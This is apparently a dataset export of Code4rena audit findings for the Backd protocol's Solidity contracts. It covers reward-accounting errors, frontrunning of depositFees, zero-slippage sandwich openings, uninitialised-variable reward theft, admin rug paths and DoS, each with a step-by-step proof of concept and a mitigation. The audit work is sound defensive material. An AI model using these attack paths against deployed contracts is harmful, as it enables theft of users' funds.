131.md,Amount distributed can be inaccurate when updating weights,medium,"<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L220>

<https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L559>

<https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L572>

<https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L586>

### Impact

When updating pool inflation rates, other pools see their `currentRate` being modified without having `poolCheckpoint` called, which leads to false computations.

This will lead to either users losing a part of their claims, but can also lead to too many tokens could be distributed, preventing some users from claiming due to the `totalAvailableToNow` requirement in `Minter`.

### Proof of Concept

Imagine you have 2 AMM pools A and B, both with an `ammPoolWeight` of 100, where `poolCheckpoint` has not been called for a moment. Then, imagine calling [`executeAmmTokenWeight`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L318) to reduce the weight of A to 0.

Only A is checkpointed [here](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L591), so when B will be checkpointed it will call `getAmmRateForToken`, which will see a pool weight of 100 and a total weight of 100 over the whole period since the last checkpoint of B, which is false, therefore it will distribute too many tokens. This is critical has the minter expects an exact or lower than expected distribution due to the requirement of `totalAvailableToNow`.

In the opposite direction, when increasing weights, it will lead to less tokens being distributed in some pools than planned, leading to a loss for users.

### Mitigation Steps

Checkpoint every `LpStakerVault`, `KeeperGauge` or `AmmGauge` when updating the weights of one of them.





***"
131.md,`BkdLocker#depositFees()` can be front run to steal the newly added rewardToken,medium,"Every time the `BkdLocker#depositFees()` gets called, there will be a surge of rewards per locked token for the existing stakeholders.

This enables a well-known attack vector, in which the attacker will take a large portion of the shares before the surge, then claim the rewards and exit immediately.

While the `_WITHDRAW_DELAY` can be set longer to mitigate this issue in the current implementation, it is possible for the admin to configure it to a very short period of time or even `0`.

In which case, the attack will be very practical and effectively steal the major part of the newly added rewards.

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L90-L100>

```solidity
function depositFees(uint256 amount) external override {
    require(amount > 0, Error.INVALID_AMOUNT);
    require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);
    IERC20(rewardToken).safeTransferFrom(msg.sender, address(this), amount);

    RewardTokenData storage curRewardTokenData = rewardTokenData[rewardToken];

    curRewardTokenData.feeIntegral += amount.scaledDiv(totalLockedBoosted);
    curRewardTokenData.feeBalance += amount;
    emit FeesDeposited(amount);
}
```

### Proof of Concept

Given:

*   Current `totalLockedBoosted()` is `100,000 govToken`;
*   Pending distribution fees amount is `1,000 rewardToken`;

1.  `depositFees()` is called to add `1,000 rewardToken`;
2.  The attacker frontrun the 1st transaction with a `lock()` transaction to deposit `100,000 govToken`, taking 50% of the pool;
3.  After the transaction in step 1 is mined, the attacker calls `claimFees()` and received `500 rewardToken`.

As a result, the attacker has stolen half of the pending fees which belong to the old users.

### Recommendation

Consider switching the reward to a `rewardRate`-based gradual release model, such as Synthetix's StakingRewards contract.

See: <https://github.com/Synthetixio/synthetix/blob/develop/contracts/StakingRewards.sol#L113-L132>



> As an additional note, please consider the fact that if the potential value gained is high enough, an attacker could just hedge the risk of locking by shorting the tokens, effectively being delta neutral while using the rewards for profit.
> 
> This means that if your token becomes liquid enough (a goal for any protocol), you would expect the withdrawal delay to become ineffective as hedging options become available.
> 
> Forcing the rewards to linearly vest will prevent the front-run from being effective and will reward long term lockers.



***"
131.md,"`Minter.sol#_executeInflationRateUpdate()` `inflationManager().checkpointAllGauges()` is called after InflationRate is updated, causing users to lose rewards",medium,"When `Minter.sol#_executeInflationRateUpdate()` is called, if an `_INFLATION_DECAY_PERIOD` has past since `lastInflationDecay`, it will update the InflationRate for all of the gauges.

However, in the current implementation, the rates will be updated first, followed by the rewards being settled using the new rates on the gauges using `inflationManager().checkpointAllGauges()`.

If the `_INFLATION_DECAY_PERIOD` has passed for a long time before `Minter.sol#executeInflationRateUpdate()` is called, the users may lose a significant amount of rewards.

On a side note, `totalAvailableToNow` is updated correctly.

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215>

```solidity
function _executeInflationRateUpdate() internal returns (bool) {
    totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));
    lastEvent = block.timestamp;
    if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {
        currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);
        if (initialPeriodEnded) {
            currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(
                annualInflationDecayKeeper
            );
            currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(
                annualInflationDecayAmm
            );
        } else {
            currentInflationAmountKeeper =
                initialAnnualInflationRateKeeper /
                _INFLATION_DECAY_PERIOD;

            currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;
            initialPeriodEnded = true;
        }
        currentTotalInflation =
            currentInflationAmountLp +
            currentInflationAmountKeeper +
            currentInflationAmountAmm;
        controller.inflationManager().checkpointAllGauges();
        lastInflationDecay = block.timestamp;
    }
    return true;
}
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L110-L125>

```solidity
function checkpointAllGauges() external override returns (bool) {
    uint256 length = _keeperGauges.length();
    for (uint256 i; i < length; i = i.uncheckedInc()) {
        IKeeperGauge(_keeperGauges.valueAt(i)).poolCheckpoint();
    }
    address[] memory stakerVaults = addressProvider.allStakerVaults();
    for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) {
        IStakerVault(stakerVaults[i]).poolCheckpoint();
    }

    length = _ammGauges.length();
    for (uint256 i; i < length; i = i.uncheckedInc()) {
        IAmmGauge(_ammGauges.valueAt(i)).poolCheckpoint();
    }
    return true;
}
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L110-L117>

```solidity
function poolCheckpoint() public override returns (bool) {
    if (killed) return false;
    uint256 timeElapsed = block.timestamp - uint256(lastUpdated);
    uint256 currentRate = IController(controller).inflationManager().getKeeperRateForPool(pool);
    perPeriodTotalInflation[epoch] += currentRate * timeElapsed;
    lastUpdated = uint48(block.timestamp);
    return true;
}
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L507-L519>

```solidity
function getKeeperRateForPool(address pool) external view override returns (uint256) {
    if (minter == address(0)) {
        return 0;
    }
    uint256 keeperInflationRate = Minter(minter).getKeeperInflationRate();
    // After deactivation of weight based dist, KeeperGauge handles the splitting
    if (weightBasedKeeperDistributionDeactivated) return keeperInflationRate;
    if (totalKeeperPoolWeight == 0) return 0;
    bytes32 key = _getKeeperGaugeKey(pool);
    uint256 poolInflationRate = (currentUInts256[key] * keeperInflationRate) /
        totalKeeperPoolWeight;
    return poolInflationRate;
}
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L173-L176>

```solidity
    function getKeeperInflationRate() external view override returns (uint256) {
        if (lastEvent == 0) return 0;
        return currentInflationAmountKeeper;
    }
```

### Proof of Concept

Given:

*   currentInflationAmountAmm: 12,000 Bkd (1000 per month)
*   annualInflationDecayAmm: 50%
*   initialPeriodEnded: true
*   lastInflationDecay: 11 months ago
*   \_INFLATION_DECAY_PERIOD: 1 year

1.  Alice deposited as the one and only staker in the `AmmGauge` pool;
2.  1 month later;
3.  `Minter.sol#_executeInflationRateUpdate()` is called;
4.  Alice `claimableRewards()` and received `500` Bkd tokens.

Expected Results:

*   Alice to receive `1000` Bkd tokens as rewards.

Actual Results:

*   Alice received `500` Bkd tokens as rewards.

### Recommendation

Consider moving the call to `checkpointAllGauges()` to before the `currentInflationAmountKeeper` is updated.

```solidity
function _executeInflationRateUpdate() internal returns (bool) {
    totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));
    lastEvent = block.timestamp;
    if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {
        controller.inflationManager().checkpointAllGauges();
        currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);
        if (initialPeriodEnded) {
            currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(
                annualInflationDecayKeeper
            );
            currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(
                annualInflationDecayAmm
            );
        } else {
            currentInflationAmountKeeper =
                initialAnnualInflationRateKeeper /
                _INFLATION_DECAY_PERIOD;

            currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;
            initialPeriodEnded = true;
        }
        currentTotalInflation =
            currentInflationAmountLp +
            currentInflationAmountKeeper +
            currentInflationAmountAmm;
        lastInflationDecay = block.timestamp;
    }
    return true;
}
```





***"
131.md,FeeBurner initiates swap without any slippage checks if Chainlink oracle fails,medium,"<https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L43-L88>

<https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/swappers/SwapperRouter.sol#L414-L425>

<https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/swappers/SwapperRouter.sol#L439>

### Impact

While the SwapperRouter contract isn't explicitly in scope, it's a dependency of the FeeBurner contract which *is* in scope. So I think it's valid to make this submission.

The SwapperRouter contract uses the chainlink oracle to compute the minimum amount of tokens it should expect from the swap. The value is then used for the slippage check. But, if the chainlink oracle fails, for whatever reason, the contract uses `0` for the slippage check instead. Thus there's a scenario where swaps initiated by the FeeBurner contract can be sandwiched.

### Proof of Concept

1.  multiple swaps initiated through [`FeeBurner.burnToTarget()`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L43-L88)
2.  SwapperRouter calls [`_minTokenAmountOut()`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/swappers/SwapperRouter.sol#L220) to determine `min_out` parameter.
3.  [`minTokenAmountOut()`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/swappers/SwapperRouter.sol#L414-L425) returns `0` when Chainlink oracle fails

### Recommended Mitigation Steps

Either revert the transaction or initiate the transaction with a default slippage of 99%. In the case of Curve, you can get the expected amount through `get_dy()` and then multiply the value by 0.99. Use that as the `min_out` value and you don't have to worry about chainlink





***"
131.md,Users can claim extremely large rewards or lock rewards from LpGauge due to uninitialised `poolLastUpdate` variable,medium,"<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L115-L119>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L326-L328>

### Impact

A user can claim all of the available governance tokens or prevent any rewards from being claimed in `LpGauge.sol` if sufficient time is left between deploying the contract and initialising it in the `StakerVault.sol` contract by calling `initalizeLPGauge()` OR if a new `LPGauge` contract is deployed and added to `StakerVault` using `prepareLPGauge`.

Inside `LPGauge.sol` when calling `_poolCheckPoint()`, the `lastUpdated` variable is not initalised so defaults to a value of `0`, therefore if the user has managed to stake tokens in the `StakerVault` then the calculated `poolStakedIntegral` will be very large (as block.timestamp is very large). Therefore a user can mint most current available governance tokens for themselves when they claim their rewards (or prevent any governance tokens from being claimed).

### Proof of Concept

1.  LP Gauge and StakerVault contracts are deployed
2.  Before the `initializeLpGauge()`, user A will stake 1 token with `stakeFor()` thereby increasing `_poolTotalStaked` by 1.
As the `lpgauge` address is equal to the zero address, `_userCheckPoint()` will not be called and `poolLastUpdate` will remain at 0.

3. The user can then directly call `_userCheckPoint()` and be allocated a very large number of shares. This works because `poolLastUpdate` is 0 but the staked amount in the vault is larger than 0

4. Once `initializeLPGauge()` is called, the user can then call `claimRewards()` and receive a very large portion of tokens or if `poolStakedIntegral` exceeds the mint limit set by `Minter.sol` then no one else can claim governance tokens from the lpGauge.<br>

OR

5. A new LP Gauge contract is deployed and added to the vault using `prepareGauge()`.
Follow steps 2 to 4.

### Recommended Mitigation Steps

Initialise `poolLastUpdate` in the constructor

 







***"
131.md,BkdLocker depositFees can be blocked,medium,"burnFees will fail if none of the pool tokens have underlying token as native ETH token. This is shown below. Since burnFees fails so no fees is deposited in BKDLocker.

### Proof of Concept

1.  Assume RewardHandler.sol has currently amount 5 as address(this).balance (ethBalance) (even attacker can send a small balance to this contract to do this dos attack)
2.  None of the pools have underlying as address(0) so no ETH tokens and only ERC20 tokens are present
3.  Now feeBurner.burnToTarget is called passing current ETH balance of amount 5 with all pool tokens
4.  feeBurner loops through all tokens and swap them to WETH. Since none of the token is ETH so burningEth\_ variable is false
5.  Now the below require condition fails since burningEth\_ is false

<!---->

    require(burningEth_ || msg.value == 0, Error.INVALID_VALUE);

6.  This fails the burnFees function.

### Recommended Mitigation Steps

ETH should not be sent if none of pool underlying token is ETH. Change it to something like below:

    bool ethFound=false;
    for (uint256 i; i < pools.length; i = i.uncheckedInc()) {
                ILiquidityPool pool = ILiquidityPool(pools[i]);
                address underlying = pool.getUnderlying();
                if (underlying != address(0)) {
                    _approve(underlying, address(feeBurner));
                } else
    {
    ethFound=true;
    }
                tokens[i] = underlying;
            }

    if(ethFound){
            feeBurner.burnToTarget{value: ethBalance}(tokens, targetLpToken);
    } else {
    feeBurner.burnToTarget(tokens, targetLpToken);
    }

 




***"
131.md,There are multiple ways for admins/governance to rug users,medium,"<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L61>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L70-L75>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L50>

### Impact

A malicious admin can steal user funds or lock their balances forever.

Even if the user is benevolent the fact that there is a rug vector available may [negatively impact the protocol's reputation](https://twitter.com/RugDocIO/status/1411732108029181960).

### Proof of Concept

Unlike the original Convex code that goes to great lengths to prevent users having the ability to transfer funds/mint things, this project introduces multiple roles and new abilities that require users to place more trust in governance:

1.  Admins can initiate migrations and set the `newPool_` to be a contract that forwards funds to accounts they control

```solidity
File: protocol/contracts/zaps/PoolMigrationZap.sol   #1

61           ILiquidityPool newPool_ = _underlyingNewPools[underlying_];
62           uint256 ethValue_ = underlying_ == address(0) ? underlyingAmount_ : 0;
63           newPool_.depositFor{value: ethValue_}(msg.sender, underlyingAmount_);
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L61-L63>

2.  Admins can add infinite `newRewardToken`s:

```solidity
File: protocol/contracts/BkdLocker.sol   #2

70       function migrate(address newRewardToken) external override onlyGovernance {
71           _replacedRewardTokens.remove(newRewardToken);
72           _replacedRewardTokens.set(rewardToken, block.timestamp);
73           lastMigrationEvent = block.timestamp;
74           rewardToken = newRewardToken;
75       }
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L70-L75>

so that `_userCheckpoint()`s, which are required to withdraw funds, revert because they run out of gas iterating over the tokens:

```solidity
File: protocol/contracts/BkdLocker.sol   #3

292       function _userCheckpoint(
293           address user,
294           uint256 amountAdded,
295           uint256 newTotal
296       ) internal {
297           RewardTokenData storage curRewardTokenData = rewardTokenData[rewardToken];
298   
299           // Compute the share earned by the user since they last updated
300           uint256 userBalance = balances[user];
301           if (userBalance > 0) {
302               curRewardTokenData.userShares[user] += (curRewardTokenData.feeIntegral -
303                   curRewardTokenData.userFeeIntegrals[user]).scaledMul(
304                       userBalance.scaledMul(boostFactors[user])
305                   );
306   
307               // Update values for previous rewardTokens
308               if (lastUpdated[user] < lastMigrationEvent) {
309                   uint256 length = _replacedRewardTokens.length();
310                   for (uint256 i; i < length; i = i.uncheckedInc()) {
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L292-L310>

3.  Admins can set a malicious `feeBurner`, via the addressProvider, which just takes the fees for itself

```solidity
File: protocol/contracts/RewardHandler.sol   #4

35       function burnFees() external override {
36           IBkdLocker bkdLocker = IBkdLocker(addressProvider.getBKDLocker());
37           IFeeBurner feeBurner = addressProvider.getFeeBurner();
38           address targetLpToken = bkdLocker.rewardToken();
39           address[] memory pools = addressProvider.allPools();
40           uint256 ethBalance = address(this).balance;
41           address[] memory tokens = new address[](pools.length);
42           for (uint256 i; i < pools.length; i = i.uncheckedInc()) {
43               ILiquidityPool pool = ILiquidityPool(pools[i]);
44               address underlying = pool.getUnderlying();
45               if (underlying != address(0)) {
46                   _approve(underlying, address(feeBurner));
47               }
48               tokens[i] = underlying;
49           }
50           feeBurner.burnToTarget{value: ethBalance}(tokens, targetLpToken);
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L35-L50>

4.  Admins can set an oracle that provides the wrong answers:

```solidity
File: protocol/contracts/swappers/SwapperRouter.sol   #5

452           try _addressProvider.getOracleProvider().getPriceETH(token_) returns (uint256 price_) {
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/swappers/SwapperRouter.sol#L452>

### Recommended Mitigation Steps

The trust-minimizing approach that Convex took was to not allow admins to change addresses. In order for things to change, an admin is allowed to completely shut everything down, and during the shut down state, users are still able to withdraw their funds. Later, the admins spin up a whole new set of contracts, and let users migrate things themselves. Something similar can be done here by having the DAO accept proposals to spawn specific contracts, and hook up specific addresses in certain ways in the new deployment.





***"
131.md,Usage of deprecated transfer to send ETH,medium,"<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/swappers/SwapperRouter.sol#L140>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/swappers/SwapperRouter.sol#L280>

### Impact

Usage of deprecated transfer Swap can revert.

### Proof of Concept

The original `transfer` used to send eth uses a fixed stipend 2300 gas.   This was used to prevent reentrancy.   However this limit your protocol to interact with others contracts that need more than that to process the transaction.

A good article about that:
<https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/>.

### Recommended Mitigation Steps

Used call instead.  For example

        (bool success, ) = msg.sender.call{amount}("""");
        require(success, ""Transfer failed."");

 




***"
131.md,Users can claim more fees than expected if governance migrates current rewardToken again by fault.,medium,"<https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L70-L75>

<https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L302-L322>

### Impact

Users can claim more fees than expected if governance migrates current rewardToken again by fault.

### Proof of Concept

In the migrate() function, there is no requirement newRewardToken != rewardToken.
If this function is called with the same ""rewardToken"" parameter, ""\_replacedRewardTokens"" will contain the current ""rewardToken"" also.
Then when the user claims fees, ""userShares"" will be added two times for the same token at L302-L305, L314-L317.

It's because ""curRewardTokenData.userFeeIntegrals\[user]"" is updated at L332 after the ""userShares"" calculation for past rewardTokens.
So the user can get paid more fees than he should.

### Tools Used

Solidity Visual Developer of VSCode

### Recommended Mitigation Steps

You need to add this require() at L71.

require(newRewardToken != rewardToken, Error.SAME_AS_CURRENT);

 




***"
131.md,Inconsistency in view functions can lead to users believing they’re due for more BKD rewards,medium,"<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L107-L111>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L129-L134>

### Impact

The view functions used for a user to check their claimable rewards vary in their implementation. This can cause users to believe they are due X amount but will receive Y.

### Proof of Concept

If the `inflationRecipient` is set, then `poolStakedIntegral` will be incremented in `claimableRewards()` but not in any other function like `allClaimableRewards()` or `poolCheckpoint()`.

If a user calls `claimableRewards()` after the `inflationRepient` has been set, `claimableRewards()` will return a larger value than `allClaimableRewards()` or the amount actually returned by `claimRewards()`.

### Recommended Mitigation Steps

To make the logic consistent, `claimableRewards()` needs `if (inflationRecipient == address(0))` added to it.




> I'm still fairly conflicted on severity as the impact is going to be quite small, however at this time, because the ""code is wrong"", I still think Medium Severity to be valid.



***"
131.md,"StakerVault.unstake(), StakerVault.unstakeFor() would revert with a uint underflow error of StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked.",medium,"<https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L98-L102>

<https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L342-L346>

<https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L391-L395>

### Impact

StakerVault.unstake(), StakerVault.unstakeFor() would revert with a uint underflow error of StakerVault.strategiesTotalStaked, StakerVault.\_poolTotalStaked.

### Proof of Concept

Currently it saves totalStaked for strategies and non-strategies separately.

uint underflow error could occur in these cases.

Scenario 1.

1.  Address A(non-strategy) stakes some amount x and it will be added to StakerVault_poolTotalStaked.
2.  This address A is approved as a strategy by StakerVault.inflationManager.
3.  Address A tries to unstake amount x, it will be deducted from StakerVault.strategiesTotalStaked because this address is a strategy already.

Even if it would succeed for this strategy but it will revert for other strategies because StakerVault.strategiesTotalStaked is less than correct staked amount for strategies.

Scenario 2.
There is a transfer between strategy and non-strategy using StakerVault.transfer(), StakerVault.transferFrom() functions.
In this case, StakerVault.strategiesTotalStaked and StakerVault.\_poolTotalStaked must be changed accordingly but there is no such logic.

### Tools Used

Solidity Visual Developer of VSCode

### Recommended Mitigation Steps

You need to modify 3 functions. StakerVault.addStrategy(), StakerVault.transfer(), StakerVault.transferFrom().

1.  You need to move staked amount from StakerVault.\_poolTotalStaked to StakerVault.strategiesTotalStaked every time when StakerVault.inflationManager approves a new strategy.

    You can modify addStrategy() at L98-L102 like this.

    function addStrategy(address strategy) external override returns (bool) {
    require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS);
    require(!strategies\[strategy], Error.ADDRESS_ALREADY_SET);

    strategies[strategy] = true;
    _poolTotalStaked -= balances[strategy];
    strategiesTotalStaked += balances[strategy];

    return true;
    }

2.  You need to add below code at L126 of transfer() function.

    if(strategies\[msg.sender] != strategies\[account]) {
    if(strategies\[msg.sender]) { // from strategy to non-strategy
    \_poolTotalStaked += amount;
    strategiesTotalStaked -= amount;
    }
    else { // from non-strategy to strategy
    \_poolTotalStaked -= amount;
    strategiesTotalStaked += amount;
    }
    }

3.  You need to add below code at L170 of transferFrom() function.

    if(strategies\[src] != strategies\[dst]) {
    if(strategies\[src]) { // from strategy to non-strategy
    \_poolTotalStaked += amount;
    strategiesTotalStaked -= amount;
    }
    else { // from non-strategy to strategy
    \_poolTotalStaked -= amount;
    strategiesTotalStaked += amount;
    }
    }

 




***"
131.md,Potential DoS when removing keeper gauge,medium,"<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L609-L618>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L82>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpActionFeeHandler.sol#L95-L98>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpAction.sol#L807>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpAction.sol#L653>

### Impact

When `_removeKeeperGauge` is called, there is no guarantee that the keeper gauge isn't currently in use by any `TopUpActionFeeHandler`. If it's still in use, any top up action executions will be disabled as reporting fees in `KeeperGauge.sol` will revert:

    function reportFees(
        address beneficiary,
        uint256 amount,
        address lpTokenAddress
    ) external override returns (bool) {
        ...
        require(!killed, Error.CONTRACT_PAUSED); // gauge is killed by InflationManager
        ...
        return true;
    }

If this happened during extreme market movements, some positions that require a top up will not be executed and be in risk of being liquidated.

### Proof of Concept

*   Alice registers a top up action.
*   Governance calls `InflationManager.removeKeeperGauge`, replacing an old keeper gauge. However, governance forgot to call `TopUpActionFeeHandler.prepareKeeperGauge` so `TopUpActionFeeHandler.getKeeperGauge` still points to the killed gauge.
*   Market moved and Alice's position should now be executed by keepers, however any attempt to execute will revert:
        > Keeper calls TopUpAction.execute();
        > _payFees();
        > IActionFeeHandler(feeHandler).payFees();
        > IKeeperGauge(keeperGauge).reportFees();
        > reverts as gauge is already killed
*   Governance noticed and calls `prepareKeeperGauge`  with a 3 days delay.
*   Alice's position got liquidated before the change is executed.

### Recommended Mitigation Steps

Consider adding an on-chain check to ensure that the keeper gauge is not in use before removing them.

 




***"
131.md,it's possible to initialize contract BkdLocker for multiple times by sending startBoost=0 and each time different values for other parameters,medium,"function `initialize()` of `BkdLocker` suppose to be called one time and contract initialize one time. but if it's called by `startBoost=0` then it's possible to call it again with different values for other parameters. there are some logics based on the values function `initilize()` sets which is in calculating boost and withdraw delay. by initializing multiple times different users get different values for those logics and because rewards are distributed based on boosts so those logics will be wrong too.

### Proof of Concept

This is `initiliaze()` code in `BkdLocker`:

        function initialize(
            uint256 startBoost,
            uint256 maxBoost,
            uint256 increasePeriod,
            uint256 withdrawDelay
        ) external override onlyGovernance {
            require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED);
            _setConfig(_START_BOOST, startBoost);
            _setConfig(_MAX_BOOST, maxBoost);
            _setConfig(_INCREASE_PERIOD, increasePeriod);
            _setConfig(_WITHDRAW_DELAY, withdrawDelay);
        }

As you can see it checks the initialization statue by `currentUInts256[_START_BOOST]`'s value but it's not correct way to do and initializer can set `currentUInts256[_START_BOOST]` value as `0` and set other parameters values and call this function multiple times with different values for `_MAX_BOOST` and `_INCREASE_PERIOD` and `_WITHDRAW_DELAY`. setting different values for those parameters can cause different calculation in `computeNewBoost()` and `prepareUnlock()`. function `computeNewBoost()` is used to calculate users boost parameters which is used on reward distribution. so by changing `_MAX_BOOST` the rewards will be distributed wrongly between old users and new users.

### Tools Used

VIM

### Recommended Mitigation Steps

Add some other variable to check the status of initialization of contract.

 




***"
131.md,Strategy in StakerVault.sol can steal more rewards even though it's designed strategies shouldn't get rewards.,medium,"<https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L95>

<https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L52-L63>

### Impact

Strategy in StakerVault.sol can steal more rewards even though it's designed strategies shouldn't get rewards.

Also there will be a problem with a rewarding system in LpGauge.sol so that some normal users wouldn't get rewards properly.

### Proof of Concept

1.  Strategy A staked amount x and x will be added to StakerVault.strategiesTotalStaked.

    contracts\StakerVault.sol#L312

2. Strategy A transferred the amount x to non-strategy B and StakerVault.strategiesTotalStaked, StakerVault.
    \_poolTotalStaked won't be updated.
    contracts\StakerVault.sol#L111

3. After some time for the larger LpGauge.poolStakedIntegral, B claims rewards using the LpGauge.claimRewards() function.
    contracts\tokenomics\LpGauge.sol#L52

    Inside LpGauge.userCheckPoint(), it's designed not to calculate LpGauge.perUserShare for strategy, but it will pass this condition because B is not a strategy.
    contracts\tokenomics\LpGauge.sol#L90

    Furthermore, when calculate rewards, LpGauge.poolStakedIntegral will be calculated larger than a normal user stakes same amount.
    It's because StakerVault.\_poolTotalStaked wasn't updated when A transfers x amount to B so LpGauge.poolTotalStaked is less than correct value.
    contracts\tokenomics\LpGauge.sol#L113-L117

    Finally B can get more rewards than he should and the reward system will pay more rewards than it's designed.

### Tools Used

Solidity Visual Developer of VSCode

### Recommended Mitigation Steps

I think there will be two methods to fix.

Method 1 is to forbid a transfer between strategy and non-strategy so that strategy can't move funds to non-strategy.

Method 2 is to update StakerVault.strategiesTotalStaked and StakerVault.\_poolTotalStaked correctly so that strategy won't claim more rewards than he should even though he claims rewards using non-strategy.

Method 1.
You need to modify two functions. StakerVault.transfer(), StakerVault.transferFrom().

1.  You need to add this require() at L112 for transfer().

    require(strategies\[msg.sender] == strategies\[account], Error.FAILED_TRANSFER);

2.  You need to add this require() at L144 for transferFrom().

    require(strategies\[src] == strategies\[dst], Error.FAILED_TRANSFER);

Method 2.
I've explained about this method in my medium risk report ""StakerVault.unstake(), StakerVault.unstakeFor() would revert with a uint underflow error of StakerVault.strategiesTotalStaked, StakerVault.\_poolTotalStaked""
I will copy the same code for your convenience.

You need to modify 3 functions. StakerVault.addStrategy(), StakerVault.transfer(), StakerVault.transferFrom().

1.  You need to move staked amount from StakerVault.\_poolTotalStaked to StakerVault.strategiesTotalStaked every time when StakerVault.inflationManager approves a new strategy.

    You can modify addStrategy() at L98-L102 like this.

    function addStrategy(address strategy) external override returns (bool) {
